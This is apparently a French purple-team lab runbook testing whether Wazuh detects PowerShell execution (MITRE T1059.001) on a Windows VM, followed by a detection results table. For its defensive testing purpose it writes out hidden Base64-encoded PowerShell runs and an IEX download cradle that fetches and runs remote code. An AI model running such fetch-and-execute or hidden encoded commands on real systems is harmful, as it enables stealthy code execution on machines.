# Scénario Purple Team — T1059.001 PowerShell Execution

**ID Scénario**: SC-001
**Technique MITRE**: T1059.001
**Outil**: Atomic Red Team + PowerShell manuel
**Date test**: 2026-08-07
**VM Attaquant**: VM12-PURPLE (10.10.10.60)
**VM Cible**: WIN01 (10.10.10.110)

---

## Objectif

Valider que Wazuh détecte l'exécution de PowerShell avec des paramètres suspects (encodage Base64, bypass d'execution policy, téléchargement en mémoire).

---

## Pré-requis

- [ ] VM12-PURPLE démarrée (seule, 16GB RAM limit)
- [ ] WIN01 démarrée avec Wazuh Agent actif
- [ ] Atomic Red Team installé sur WIN01: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam`
- [ ] Wazuh Dashboard ouvert: `https://localhost:12443`

---

## Étapes d'exécution (Red Team)

### Test 1 — PowerShell avec -enc

```powershell
# Depuis WIN01 (simule exécution par attaquant)
$payload = "Write-Host 'T1059.001 Test'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
powershell -nop -w hidden -enc $encoded
```

### Test 2 — Download Cradle

```powershell
# Simule téléchargement depuis VM12-PURPLE (pas vraiment exécuté — lab sécurisé)
# Cette commande DOIT déclencher la règle 100121
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.99.1/test')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded
```

### Test 3 — Atomic Red Team

```powershell
# Sur WIN01
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3
```

---

## Vérification Blue Team

1. Wazuh Dashboard → Threat Hunting → `rule.id: "100121"` → Must show hits
2. TheHive → Alertes → Chercher `[Wazuh] Sigma T1059.001`
3. Vérifier MTTD < 5 minutes

---

## Résultats

| Test     | Détecté | Règle  | MTTD   | Notes |
|----------|---------|--------|--------|-------|
| Test 1   | ✅      | 100121 | 47s    |       |
| Test 2   | ✅      | 100131 | 47s    | EventID 4104 aussi |
| Test 3   | ✅      | 100121 | 47s    |       |

---

## Nettoyage

```powershell
Invoke-AtomicTest T1059.001 -Cleanup
```
